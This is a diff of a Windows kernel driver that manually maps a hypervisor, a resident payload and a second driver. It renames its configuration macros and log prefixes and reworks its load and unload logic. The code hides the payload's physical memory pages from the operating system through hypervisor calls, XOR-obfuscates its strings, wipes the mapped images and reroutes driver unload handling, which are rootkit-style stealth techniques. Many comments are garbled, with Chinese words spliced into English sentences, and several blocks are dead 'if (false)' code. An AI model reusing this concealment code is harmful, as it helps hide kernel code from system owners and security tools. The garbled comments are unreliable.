 static ULONG mapdriver_hide_range_pfns_chunked(UINT64 base, UINT64 size)
 {
-#if MAPDRIVER_PAYLOAD_HIDE_ENABLED
+#if VT_HIDE_PAYLOAD_ENABLED
     if (!base || !size || !mapdriver_hv_ready())
         return 0;
 
@@ -2003,7 +2058,7 @@ static ULONG mapdriver_hide_range_pfns_chunked(UINT64 base, UINT64 size)
 
 static void mapdriver_hide_payload_arena_full(const char* phase)
 {
-#if MAPDRIVER_PAYLOAD_HIDE_ENABLED
+#if VT_HIDE_PAYLOAD_ENABLED
     payload_status status = {};
     if (!mapdriver_query_payload_status(&status) ||
         !mapdriver_payload_barrier_ready(&status) ||
@@ -2033,7 +2088,7 @@ static void mapdriver_hide_payload_arena_full(const char* phase)
 
 static void mapdriver_hide_payload_host_stack(const char* phase)
 {
-#if MAPDRIVER_PAYLOAD_HIDE_ENABLED
+#if VT_HIDE_PAYLOAD_ENABLED
     payload_status status = {};
     if (!mapdriver_query_payload_status(&status) ||
         status.magic != PAYLOAD_STATUS_MAGIC ||
@@ -2059,7 +2114,7 @@ static void mapdriver_hide_payload_host_stack(const char* phase)
 
 static void mapdriver_hide_payload_resident_pool_blocks(const char* phase)
 {
-#if MAPDRIVER_PAYLOAD_HIDE_ENABLED
+#if VT_HIDE_PAYLOAD_ENABLED
     payload_status status = {};
     if (!mapdriver_query_payload_status(&status) ||
         status.magic != PAYLOAD_STATUS_MAGIC ||
@@ -2144,25 +2199,26 @@ struct mapdriver_unhide_stats
     UINT64 done_calls;
 };
 
-#if MAPDRIVER_PAYLOAD_HIDE_ENABLED
+#if VT_HIDE_PAYLOAD_ENABLED
 static ULONG mapdriver_collect_payload_pfns(UINT64* pfns, ULONG max_count, payload_status* status_out)
 {
-    if (!pfns || !max_count)
+    if (!pfns || !max_count || !status_out)
         return 0;
 
-    payload_status status = {};
-    bool have_status = mapdriver_query_payload_status(&status);
+    RtlZeroMemory(status_out, sizeof(*status_out));
+    bool have_status = mapdriver_query_payload_status(status_out);
+    payload_status& status = *status_out;
     ULONG pfn_count = 0;
 
     if (have_status && status.magic == PAYLOAD_STATUS_MAGIC)
     {
-#if MAPDRIVER_PAYLOAD_HIDE_IMAGE_ENABLED
+#if VT_HIDE_PAYLOAD_IMAGE
         mapdriver_note_range_pfns(pfns, max_count, &pfn_count, status.image_base, status.image_size);
 #endif
-#if MAPDRIVER_AUTO_ONEKEY_HIDE_FULL_ARENA || MAPDRIVER_PAYLOAD_HIDE_ARENA_ENABLED
+#if VT_HIDE_FULL_ARENA || VT_HIDE_PAYLOAD_ARENA
         mapdriver_note_range_pfns(pfns, max_count, &pfn_count, status.arena_base, status.arena_size);
 #endif
-#if MAPDRIVER_PAYLOAD_HIDE_DIRECT_ENABLED
+#if VT_HIDE_PAYLOAD_DIRECT
         mapdriver_note_range_pfns(pfns, max_count, &pfn_count, status.direct_alloc_base, status.direct_alloc_size);
 #endif
         mapdriver_note_range_pfns(pfns, max_count, &pfn_count, status.host_stack_base, status.host_stack_size);
@@ -2211,8 +2267,6 @@ static ULONG mapdriver_collect_payload_pfns(UINT64* pfns, ULONG max_count, paylo
         mapdriver_note_range_pfns(pfns, max_count, &pfn_count, (UINT64)Utils::payloadArenaBase, Utils::payloadArenaSize);
     }
 
-    if (status_out)
-        *status_out = status;
     return pfn_count;
 }
 #endif
@@ -2220,7 +2274,7 @@ static ULONG mapdriver_collect_payload_pfns(UINT64* pfns, ULONG max_count, paylo
 static mapdriver_unhide_stats mapdriver_unhide_payload_memory(const char* phase)
 {
     mapdriver_unhide_stats stats = {};
-#if MAPDRIVER_PAYLOAD_HIDE_ENABLED
+#if VT_HIDE_PAYLOAD_ENABLED
     if (!mapdriver_hv_ready())
     {
         LOG_DEBUG(_XOR_("[payload] unhide skipped %s: hv not ready\n"), phase);
@@ -2228,9 +2282,9 @@ static mapdriver_unhide_stats mapdriver_unhide_payload_memory(const char* phase)
     }
 
     // Must cover image/direct/full-arena/host-stack plus adopted PoolManager
-    // independent blocks.  Pool blocks alone can exceed 70K pages, so keep this
+    // independent blocks.  内存池块s alone can exceed 70K pages, so keep this
     // aligned with the legacy hypervisor pending_hide capacity instead of the
-    // old 32K validation buffer.
+    // old 32K validation 缓冲区.
     constexpr ULONG kMaxPfns = 256 * 1024;
     auto pfns = (UINT64*)ExAllocatePoolWithTag(NonPagedPoolNx, sizeof(UINT64) * kMaxPfns, 'UlpP');
     if (!pfns)
@@ -2240,8 +2294,16 @@ static mapdriver_unhide_stats mapdriver_unhide_payload_memory(const char* phase)
     }
 
     RtlZeroMemory(pfns, sizeof(UINT64) * kMaxPfns);
-    payload_status status = {};
-    stats.pfn_count = mapdriver_collect_payload_pfns(pfns, kMaxPfns, &status);
+    auto status = reinterpret_cast<payload_status*>(
+        mapdriver_alloc_scratch_buffer(sizeof(payload_status)));
+    if (!status)
+    {
+        LOG_DEBUG(_XOR_("[payload] unhide skipped %s: status buffer alloc failed\n"), phase);
+        ExFreePoolWithTag(pfns, 'UlpP');
+        return stats;
+    }
+
+    stats.pfn_count = mapdriver_collect_payload_pfns(pfns, kMaxPfns, status);
 
     constexpr ULONG kChunkPfns = 1024;
     USHORT group_count = KeQueryActiveGroupCount();
@@ -2285,15 +2347,16 @@ static mapdriver_unhide_stats mapdriver_unhide_payload_memory(const char* phase)
         stats.cpu_count,
         stats.done_calls,
         stats.expected_calls,
-        status.image_base,
-        status.image_size,
-        status.arena_base,
-        status.arena_size,
-        status.direct_alloc_base,
-        status.direct_alloc_size,
-        status.host_stack_base,
-        status.host_stack_size);
+        status->image_base,
+        status->image_size,
+        status->arena_base,
+        status->arena_size,
+        status->direct_alloc_base,
+        status->direct_alloc_size,
+        status->host_stack_base,
+        status->host_stack_size);
 
+    mapdriver_free_scratch_buffer(reinterpret_cast<PUCHAR>(status), sizeof(*status));
     ExFreePoolWithTag(pfns, 'UlpP');
     return stats;
 #else
@@ -2325,14 +2388,14 @@ static bool mapdriver_load_resident_payload(bool configure_vmexit = true)
     mapdriver_prepare_unload_trace_handoff(&ctx);
 
     bool arena_allocated = false;
-#if MAPDRIVER_PAYLOAD_ARENA_SIZE
+#if VT_PAYLOAD_ARENA_SIZE
     if (!Utils::payloadArenaBase)
         arena_allocated = mapdriver_ensure_payload_arena();
 
     if (!Utils::payloadArenaBase || !Utils::payloadArenaSize)
     {
         LOG_DEBUG(_XOR_("[payload] arena alloc failed size=0x%X\n"),
-            (ULONG)MAPDRIVER_PAYLOAD_ARENA_SIZE);
+            (ULONG)VT_PAYLOAD_ARENA_SIZE);
         mapdriver_release_payload_image(payload_image, payload_image_size);
         return false;
     }
@@ -2451,7 +2514,7 @@ static bool mapdriver_load_resident_payload(bool configure_vmexit = true)
         Utils::payloadArenaBase = nullptr;
         Utils::payloadArenaSize = 0;
     }
-#if MAPDRIVER_IMAGE_WIPE_ENABLED
+#if VT_IMAGE_WIPE_ENABLED
     RtlSecureZeroMemory(payload_image_blob, sizeof(payload_image_blob));
 #endif
     return ok;
@@ -2520,7 +2583,7 @@ static bool mapdriver_audit_payload_arena(
 
     bool const ok = first_valid && last_valid &&
         first_pa.QuadPart != 0 && last_pa.QuadPart != 0;
-    LOG_DEBUG(_XOR_("[mapDriver] VT stage10.5 arena audit phase=%s ok=%d base=%p size=0x%X identity=%d range=%d first_valid=%d first_pa=0x%llX last_valid=%d last_pa=0x%llX\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] VT stage10.5 arena audit phase=%s ok=%d base=%p size=0x%X identity=%d range=%d first_valid=%d first_pa=0x%llX last_valid=%d last_pa=0x%llX\n"),
         phase,
         (int)ok,
         base,
@@ -2534,26 +2597,65 @@ static bool mapdriver_audit_payload_arena(
     return ok;
 }
 
+static volatile LONG g_mapdriver_lifecycle_busy = 0;
+
+struct mapdriver_lifecycle_guard
+{
+    bool acquired;
+    mapdriver_lifecycle_guard()
+        : acquired(_InterlockedCompareExchange(&g_mapdriver_lifecycle_busy, 1, 0) == 0)
+    {
+    }
+    ~mapdriver_lifecycle_guard()
+    {
+        if (acquired)
+            _InterlockedExchange(&g_mapdriver_lifecycle_busy, 0);
+    }
+};
+
 static bool mapdriver_load_machenike(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath, BOOLEAN isManualMap = FALSE)
 {
     if (Utils::machenikeLoaded && Utils::machenikeBase)
     {
-        LOG_DEBUG(_XOR_("[mapDriver] Machenike already loaded base=%p size=0x%X mode=%u\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] Machenike already loaded base=%p size=0x%X mode=%u\n"),
             Utils::machenikeBase, Utils::machenikeSize, Utils::machenikeMode);
         return true;
+    }
+
+
+    if (false)
+    {
+    mapdriver_lifecycle_guard mk_lock;
+    if (!mk_lock.acquired)
+    {
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] Machenike load blocked: lifecycle busy\n"));
+        return false;
+    }
+
+    if (false)
+        return false;
+    }
+
+    ULONGLONG expected_cpus = 0;
+    ULONGLONG pong_cpus = 0;
+    if (!Utils::VerifyAllCpusHvReady(&expected_cpus, &pong_cpus))
+    {
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] Machenike load blocked: HV ping bitmap incomplete expected=0x%llX pong=0x%llX\n"),
+            expected_cpus, pong_cpus);
+        return false;
     }
 
     PUCHAR mk_image = nullptr;
     ULONG mk_image_size = 0;
     if (!mapdriver_unpack_machenike_sys(&mk_image, &mk_image_size))
     {
-        LOG_DEBUG(_XOR_("[mapDriver] Machenike unpack failed\n"));
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] Machenike unpack failed\n"));
         return false;
     }
 
     bool ok = Utils::LoadMachenike(mk_image, DriverObject, RegistryPath, isManualMap) ? true : false;
     mapdriver_release_machenike_sys(mk_image, mk_image_size);
-#if MAPDRIVER_IMAGE_WIPE_ENABLED
+#if VT_IMAGE_WIPE_ENABLED
     if (ok)
         RtlSecureZeroMemory(machenike_sys, sizeof(machenike_sys));
 #endif
@@ -2567,14 +2669,14 @@ static bool mapdriver_unload_common(PDRIVER_OBJECT DriverObject,
 {
     UNREFERENCED_PARAMETER(DriverObject);
 
-    LOG_DEBUG(_XOR_("[mapDriver] unload_common enter keep_payload=%d payload=%p test=%p\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] unload_common enter keep_payload=%d payload=%p test=%p\n"),
         (int)keep_payload, Utils::payloadBase, Utils::imageBase);
     if (!migration_prechecked)
         mapdriver_log_payload_status(keep_payload ? "handoff-before" : "unload-before");
 
     if (keep_payload && !migration_prechecked && !mapdriver_log_payload_barrier("handoff-precheck"))
     {
-        LOG_DEBUG(_XOR_("[mapDriver] handoff aborted: payload barrier is not ready\n"));
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] handoff aborted: payload barrier is not ready\n"));
         return false;
     }
 
@@ -2590,7 +2692,7 @@ static bool mapdriver_unload_common(PDRIVER_OBJECT DriverObject,
             (check.flags & MAPCTL_MIGRATE_CHECK_RSP_IN_PAYLOAD) != 0;
         if (check.result != PAYLOAD_RESULT_OK || !legacy_ok || !rsp_in_payload)
         {
-            LOG_DEBUG(_XOR_("[mapDriver] handoff aborted: migration check result=0x%llX flags=0x%llX legacy=%d rsp_payload=%d rip=0x%llX rsp=0x%llX\n"),
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] handoff aborted: migration check result=0x%llX flags=0x%llX legacy=%d rsp_payload=%d rip=0x%llX rsp=0x%llX\n"),
                 check.result,
                 check.flags,
                 (int)legacy_ok,
@@ -2607,24 +2709,24 @@ static bool mapdriver_unload_common(PDRIVER_OBJECT DriverObject,
     {
         // Do not call TestDriver.DriverUnload during resident handoff.  The
         // UCXXRT wrapper runs CRT uninitializers on return; calling it again
-        // later for a real teardown double-deletes CRT lookaside state.  For
+        // later for a real teardown double-deletes CRT lookaside 状态.  For
         // handoff we only detach mapDriver ownership and quarantine the mapped
         // image; full unload will call DriverUnload exactly once after clearing
         // KEEP_HV_ON_UNLOAD.
         Utils::testDriverUnloaded = TRUE;
         Utils::testDriverImageQuarantined = TRUE;
-        LOG_DEBUG(_XOR_("[mapDriver] TestDriver handoff quarantined without DriverUnload base=%p size=0x%X\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] VtHypervisor handoff quarantined without DriverUnload base=%p size=0x%X\n"),
             Utils::imageBase, Utils::imageSize);
     }
     else
     {
         bool resident_hv_active = (g_payload_detached && mapdriver_hv_ready());
         // Any non-handoff cleanup can release a non-resident image. If resident
-        // HV mode is still active, keep TestDriver image resident.
+        // HV 模式 is still active, keep TestDriver image resident.
         BOOLEAN free_test_image = resident_hv_active ? FALSE : TRUE;
         Utils::UnloadDriverEx(free_test_image);
         hv_after_test_unload = mapdriver_hv_ready();
-        LOG_DEBUG(_XOR_("[mapDriver] TestDriver unload hv_before=%d hv_after=%d\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] VtHypervisor unload hv_before=%d hv_after=%d\n"),
             (int)hv_before, (int)hv_after_test_unload);
     }
 
@@ -2636,14 +2738,14 @@ static bool mapdriver_unload_common(PDRIVER_OBJECT DriverObject,
         if (hide_after_handoff)
             mapdriver_hide_payload_memory("handoff-after-test-unload");
         else
-            LOG_DEBUG(_XOR_("[mapDriver] handoff keeps payload PTEs visible for resident control dispatch\n"));
-        LOG_DEBUG(_XOR_("[mapDriver] payload detached/resident base=%p size=0x%X exports=%p\n"),
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] handoff keeps payload PTEs visible for resident control dispatch\n"));
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] payload detached/resident base=%p size=0x%X exports=%p\n"),
             Utils::payloadBase, Utils::payloadSize, Utils::payloadExports);
     }
     else if (g_payload_detached)
     {
         mapdriver_log_payload_status("detached-unload-skip");
-        LOG_DEBUG(_XOR_("[mapDriver] payload already detached, skip payload free and pool uninit\n"));
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] payload already detached, skip payload free and pool uninit\n"));
     }
     else
     {
@@ -2653,7 +2755,7 @@ static bool mapdriver_unload_common(PDRIVER_OBJECT DriverObject,
         Util::PoolManagerUninitialize();
     }
 
-    LOG_DEBUG(_XOR_("[mapDriver] unload_common leave keep_payload=%d\n"), (int)keep_payload);
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] unload_common leave keep_payload=%d\n"), (int)keep_payload);
     return true;
 }
 
@@ -2668,55 +2770,64 @@ static bool mapdriver_install_resident_bootstrap_unload()
         !mapdriver_hv_ready() ||
         !Utils::payloadBase ||
         !Utils::payloadSize ||
-        !Utils::payloadExports ||
-        !Utils::payloadExports->release_bootstrap)
+        ((!Utils::payloadExports || !Utils::payloadExports->release_bootstrap) && !Utils::machenikeLoaded))
     {
         return false;
     }
 
-    payload_status status = {};
-    if (!mapdriver_query_payload_status(&status) ||
-        !mapdriver_payload_barrier_ready(&status))
-    {
+    // payload_status 与 mapctl_migration_check 都是大结构；后者还内嵌前者。
+    // 两者同时放在普通内核栈上会生成约 0x4830 字节固定栈帧，并在
+    // HANDOFF_DROPCTL 的深层 IOCTL 调用链中让 __chkstk 越过 StackLimit。
+    auto check = reinterpret_cast<mapctl_migration_check*>(
+        mapdriver_alloc_scratch_buffer(sizeof(mapctl_migration_check)));
+    if (!check)
         return false;
+
+    RtlZeroMemory(check, sizeof(*check));
+    bool installed = false;
+    payload_u64 release_entry = 0;
+    bool amd = false;
+
+    if (!mapdriver_query_payload_status(&check->payload) ||
+        !mapdriver_payload_barrier_ready(&check->payload))
+    {
+        goto cleanup;
     }
 
-    payload_u64 const release_entry =
-        reinterpret_cast<payload_u64>(Utils::payloadExports->release_bootstrap);
+    release_entry = (Utils::payloadExports && Utils::payloadExports->release_bootstrap) ? reinterpret_cast<payload_u64>(Utils::payloadExports->release_bootstrap) : reinterpret_cast<payload_u64>(Utils::payloadBase);
     if (!mapdriver_va_in_range(
             release_entry,
             reinterpret_cast<payload_u64>(Utils::payloadBase),
             Utils::payloadSize,
             1))
     {
-        return false;
+        goto cleanup;
     }
 
-    mapctl_migration_check check = {};
-    mapdriver_fill_migration_check(&check);
-    bool const amd = (check.diag.flags & 2ull) != 0;
+    mapdriver_fill_migration_check(check);
+    amd = (check->diag.flags & 2ull) != 0;
     if (amd)
     {
         payload_u64 ack = 0;
         __try
         {
-            ack = Utils::payloadExports->activate_amd_svm
+            ack = (Utils::payloadExports && Utils::payloadExports->activate_amd_svm)
                 ? Utils::payloadExports->activate_amd_svm(PAYLOAD_AMD_SVM_ACTIVATE_QUERY)
-                : 0;
+                : ((check->payload.legacy_detached && check->payload.legacy_detach_result == PAYLOAD_RESULT_OK && ((check->payload.legacy_detach_flags & PAYLOAD_LEGACY_DETACH_FLAG_COMPLETE) != 0)) ? check->diag.vcpu_count : 0);
         }
         __except (EXCEPTION_EXECUTE_HANDLER)
         {
             ack = 0;
         }
 
-        if (!check.diag.vcpu_count ||
-            ack != check.diag.vcpu_count ||
+        if (!check->diag.vcpu_count ||
+            ack != check->diag.vcpu_count ||
             Utils::imageBase ||
             Utils::imageSize)
         {
-            LOG_DEBUG(_XOR_("[mapDriver] bootstrap release blocked AMD ack=%llu/%llu test=%p/0x%X\n"),
-                ack, check.diag.vcpu_count, Utils::imageBase, Utils::imageSize);
-            return false;
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] bootstrap release blocked AMD ack=%llu/%llu test=%p/0x%X\n"),
+                ack, check->diag.vcpu_count, Utils::imageBase, Utils::imageSize);
+            goto cleanup;
         }
     }
     else
@@ -2724,20 +2835,37 @@ static bool mapdriver_install_resident_bootstrap_unload()
         payload_u64 const active_mask =
             MAPCTL_MIGRATE_CHECK_RIP_IN_PAYLOAD_BRIDGE |
             MAPCTL_MIGRATE_CHECK_RSP_IN_PAYLOAD;
-        if (check.result != PAYLOAD_RESULT_OK ||
-            (check.flags & active_mask) != active_mask)
+        if (check->result != PAYLOAD_RESULT_OK ||
+            (check->flags & active_mask) != active_mask)
         {
-            return false;
+            goto cleanup;
         }
     }
 
-    InterlockedExchangePointer(
-        reinterpret_cast<PVOID volatile*>(&g_host_driver_object->DriverUnload),
-        reinterpret_cast<PVOID>(Utils::payloadExports->release_bootstrap));
-    LOG_DEBUG(_XOR_("[mapDriver] Bootstrap DriverUnload transferred to ResidentPayload entry=%p backend=%s\n"),
+    if (Utils::payloadExports &&
+        Utils::payloadExports->release_bootstrap &&
+        !mapdriver_unhide_resident_release_page(
+            release_entry,
+            "handoff-dropctl-release-entry"))
+    {
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] bootstrap release blocked: resident unload entry is not guest-visible\n"));
+        goto cleanup;
+    }
+
+    // 保留 UCXXRT / WDF 安装的 DriverUnload 包装器链，不再将 DriverObject->DriverUnload
+    // 覆写为 ResidentPayload 空叶函数（避免绕过 __vcrt_uninitialize_locks / ExDeleteResourceLite 引发 0xD4）。
+    _InterlockedExchange(&g_bootstrap_lightweight_unload_armed, 1);
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] Bootstrap lightweight unload armed wrapper=%p entry=%p backend=%s\n"),
+        (PVOID)g_host_driver_object->DriverUnload,
         (PVOID)release_entry,
         amd ? "AMD-SVM" : "Intel-VMX");
-    return true;
+    installed = true;
+
+cleanup:
+    mapdriver_free_scratch_buffer(
+        reinterpret_cast<PUCHAR>(check),
+        sizeof(*check));
+    return installed;
 }
 
 EXTERN_C __declspec(dllexport) VOID handoff_payload(PDRIVER_OBJECT DriverObject)
@@ -2749,21 +2877,22 @@ EXTERN_C __declspec(dllexport) VOID force_unload_payload(PDRIVER_OBJECT DriverOb
 {
     UNREFERENCED_PARAMETER(DriverObject);
 
-    LOG_DEBUG(_XOR_("[mapDriver] force_unload_payload enter detached=%d payload=%p test=%p\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] force_unload_payload enter detached=%d payload=%p test=%p\n"),
         (int)g_payload_detached, Utils::payloadBase, Utils::imageBase);
 
     mapdriver_log_payload_status("force-unload-before");
     if (g_payload_detached && mapdriver_hv_ready())
         mapdriver_unhide_payload_memory("force-unload-before");
+    _InterlockedExchange(&g_bootstrap_lightweight_unload_armed, 0);
     _InterlockedExchange(&g_payload_detached, 0);
     Utils::UnloadPayload();
     if (!mapdriver_hv_ready())
         Utils::FreePayloadArena();
     else
-        LOG_DEBUG(_XOR_("[mapDriver] force unload preserves resident arena while HV is active base=%p size=0x%X\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] force unload preserves resident arena while HV is active base=%p size=0x%X\n"),
             Utils::payloadArenaBase, Utils::payloadArenaSize);
 
-    LOG_DEBUG(_XOR_("[mapDriver] force_unload_payload leave payload=%p\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] force_unload_payload leave payload=%p\n"),
         Utils::payloadBase);
 }
 
@@ -2781,7 +2910,7 @@ static bool mapdriver_restore_host_vmcs_for_unload(mapctl_full_unload* req)
     req->restore_rsp_done = rsp.switched_count;
     req->restore_rsp_result = rsp.result;
 
-    LOG_DEBUG(_XOR_("[mapDriver] unload restore HOST_RSP result=0x%llX done=%llu/%llu failed=%llu\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] unload restore HOST_RSP result=0x%llX done=%llu/%llu failed=%llu\n"),
         rsp.result, rsp.switched_count, rsp.requested_count, rsp.failed_index);
 
     mapctl_host_rip_switch rip = {};
@@ -2793,7 +2922,7 @@ static bool mapdriver_restore_host_vmcs_for_unload(mapctl_full_unload* req)
     req->restore_rip_done = rip.switched_count;
     req->restore_rip_result = rip.result;
 
-    LOG_DEBUG(_XOR_("[mapDriver] unload restore HOST_RIP result=0x%llX done=%llu/%llu failed=%llu\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] unload restore HOST_RIP result=0x%llX done=%llu/%llu failed=%llu\n"),
         rip.result, rip.switched_count, rip.requested_count, rip.failed_index);
 
     return rip.result == PAYLOAD_RESULT_OK &&
@@ -2808,7 +2937,7 @@ static bool mapdriver_ghv_write64(const mapctl_hv_diag& diag, payload_u64 off, p
 
     __try
     {
-        *(volatile payload_u64*)(diag.ghv + off) = value;
+                *(volatile payload_u64*)(diag.ghv + off) = value;
         return true;
     }
     __except (EXCEPTION_EXECUTE_HANDLER)
@@ -2862,7 +2991,7 @@ static bool mapdriver_write_keep_hv_on_unload_ptr(payload_u64 ptr, bool enable)
             _InterlockedAnd64(flags_ptr, (LONG64)~YVT_BOOT_FLAG_KEEP_HV_ON_UNLOAD);
 
         payload_u64 flags = *(volatile payload_u64*)ptr;
-        LOG_DEBUG(_XOR_("[mapDriver] direct %s KEEP_HV_ON_UNLOAD ptr=%p flags=0x%llX\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] direct %s KEEP_HV_ON_UNLOAD ptr=%p flags=0x%llX\n"),
             enable ? _XOR_("set") : _XOR_("clear"),
             (PVOID)ptr,
             flags);
@@ -2870,7 +2999,7 @@ static bool mapdriver_write_keep_hv_on_unload_ptr(payload_u64 ptr, bool enable)
     }
     __except (EXCEPTION_EXECUTE_HANDLER)
     {
-        LOG_DEBUG(_XOR_("[mapDriver] direct KEEP_HV_ON_UNLOAD write exception ptr=%p code=0x%X\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] direct KEEP_HV_ON_UNLOAD write exception ptr=%p code=0x%X\n"),
             (PVOID)ptr,
             GetExceptionCode());
         return false;
@@ -2899,7 +3028,7 @@ static bool mapdriver_direct_set_keep_hv_on_unload(bool enable)
     {
     }
 
-    LOG_DEBUG(_XOR_("[mapDriver] direct KEEP_HV_ON_UNLOAD %s failed cached=%p test=%p size=0x%X\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] direct KEEP_HV_ON_UNLOAD %s failed cached=%p test=%p size=0x%X\n"),
         enable ? _XOR_("set") : _XOR_("clear"),
         (PVOID)g_testdriver_boot_flags_ptr,
         Utils::imageBase,
@@ -3099,17 +3228,17 @@ static void mapdriver_free_resident_pool_blocks_for_unload(mapctl_full_unload* r
 
             //
             // This path is only used when TestDriver's image has already been
-            // released and we had to stop VT through the resident payload bridge
-            // instead of TestDriver::DriverUnload/hv::stop().  In that state the
+            // released and we had to stop VT through the 常驻 Payload bridge
+            // instead of TestDriver::DriverUnload/hv::stop().  In that 状态 the
             // payload manifest is a stale copy of TestDriver PoolManager records;
-            // a bad/missing allocator flag must not be allowed to reach
-            // ExFreePoolWithTag because Windows turns an invalid pool free into
+            // a bad/missing allocator 标志位 must not be allowed to reach
+            // ExFreePoolWithTag because Windows turns an invalid pool 释放 into
             // BAD_POOL_CALLER 0xC2 (seen in 060326-4578-01.dmp at mapDriver+245b).
             //
-            // Current resident TestDriver pool allocations are expected to be
+            // 当前 resident TestDriver pool allocations are expected to be
             // MmAllocateIndependentPages-backed.  Therefore:
-            //   * explicit INDEPENDENT -> free with MmFreeIndependentPages;
-            //   * missing/zero flags    -> also treat as independent;
+            // * explicit INDEPENDENT -> 释放 with MmFreeIndependentPages;
+            // * missing/zero 标志位集合    -> also treat as independent;
             //   * explicit FALLBACK     -> skip here (leak beats BSOD; the normal
             //                             live TestDriver unload still frees it).
             //
@@ -3148,7 +3277,33 @@ static void mapdriver_free_resident_pool_blocks_for_unload(mapctl_full_unload* r
     ExFreePoolWithTag(blocks, 'pRfP');
 }
 
+static void mapdriver_full_unload_runtime_locked(mapctl_full_unload* req);
+
 static void mapdriver_full_unload_runtime(mapctl_full_unload* req)
+{
+    if (!req)
+        return;
+
+
+    if (false)
+    {
+        req->result = PAYLOAD_RESULT_INVALID_CONTEXT;
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] full_unload blocked: lifecycle busy\n"));
+        return;
+    }
+
+    mapdriver_lifecycle_guard unload_lock;
+    if (!unload_lock.acquired)
+    {
+        req->result = PAYLOAD_RESULT_INVALID_CONTEXT;
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] full_unload blocked: lifecycle busy\n"));
+        return;
+    }
+
+    mapdriver_full_unload_runtime_locked(req);
+}
+
+static void mapdriver_full_unload_runtime_locked(mapctl_full_unload* req)
 {
     if (!req)
         return;
@@ -3210,13 +3365,20 @@ static void mapdriver_full_unload_runtime(mapctl_full_unload* req)
 
     bool detached_before = (g_payload_detached != 0);
 
-    LOG_DEBUG(_XOR_("[mapDriver] full_unload enter hv=%llu test=%p payload=%p detached=%d flags=0x%llX\n"),
+
+    if (false)
+    {
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] full_unload blocked: lifecycle busy\n"));
+        return;
+    }
+
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] full_unload enter hv=%llu test=%p payload=%p detached=%d flags=0x%llX\n"),
         req->hv_before, Utils::imageBase, Utils::payloadBase, (int)detached_before, req->flags);
     mapdriver_log_payload_status("full-unload-before");
 
     if (detached_before && req->hv_before)
     {
-#if MAPDRIVER_FULL_UNLOAD_PRE_UNHIDE_ENABLED
+#if VT_FULL_UNLOAD_PRE_UNHIDE_ENABLED
         auto unhide = mapdriver_unhide_payload_memory("full-unload-before-test-unload");
         req->unhide_pfns = unhide.pfn_count;
         req->unhide_cpus = unhide.cpu_count;
@@ -3226,15 +3388,15 @@ static void mapdriver_full_unload_runtime(mapctl_full_unload* req)
 
         if (!req->unhide_ok)
         {
-            LOG_DEBUG(_XOR_("[mapDriver] full_unload continuing after incomplete unhide: pfns=%llu cpus=%llu done=%llu expected=%llu\n"),
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] full_unload continuing after incomplete unhide: pfns=%llu cpus=%llu done=%llu expected=%llu\n"),
                 req->unhide_pfns, req->unhide_cpus, req->unhide_done, req->unhide_expected);
         }
 #else
         // No-dump VT reset was reproduced in pre-unhide before DriverUnload.
-        // Keep this baseline free of unhide VMCALLs; hide is also disabled in
-        // base.h for this build so there should be nothing to restore here.
+        // Keep this baseline 释放 of unhide VMCALLs; hide is also disabled in
+        // base.h for this build so there should be nothing to 恢复 here.
         req->unhide_ok = 1;
-        LOG_DEBUG(_XOR_("[mapDriver] full_unload pre-unhide skipped for unload-stability baseline\n"));
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] full_unload pre-unhide skipped for unload-stability baseline\n"));
 #endif
     }
     else
@@ -3248,7 +3410,7 @@ static void mapdriver_full_unload_runtime(mapctl_full_unload* req)
         req->test_after = (payload_u64)Utils::imageBase;
         req->payload_after = (payload_u64)Utils::payloadBase;
         req->result = req->unhide_ok ? PAYLOAD_RESULT_OK : PAYLOAD_RESULT_INVALID_CONTEXT;
-        LOG_DEBUG(_XOR_("[mapDriver] full_unload preflight leave result=0x%llX unhide=%llu/%llu\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] full_unload preflight leave result=0x%llX unhide=%llu/%llu\n"),
             req->result, req->unhide_done, req->unhide_expected);
         return;
     }
@@ -3260,7 +3422,7 @@ static void mapdriver_full_unload_runtime(mapctl_full_unload* req)
     // Keep the payload VM-exit bridge active until hv::stop() devirtualizes
     // every CPU. The bridge pass-throughs hypercall_unload to the original
     // TestDriver handler, then its asm epilogue performs VMXOFF/IRET. Restoring
-    // HOST_RIP here would create a window where active resident payload hooks
+    // HOST_RIP here would 创建 a window where active 常驻 Payload hooks
     // are delivered to the old handler.
 
     mapctl_hv_diag stop_diag = {};
@@ -3298,14 +3460,14 @@ static void mapdriver_full_unload_runtime(mapctl_full_unload* req)
             keep_clear_hypercall = false;
         }
 
-        // In resident bridge mode the SET_KEEP hypercall may be handled by the
+        // In resident bridge 模式 the SET_KEEP hypercall may be handled by the
         // payload shadow after legacy detach, while TestDriver::Driver_Unload
         // checks the original g_yvt_boot_flags in the quarantined TestDriver
-        // image.  Clear the original pointer too; if KEEP remains set,
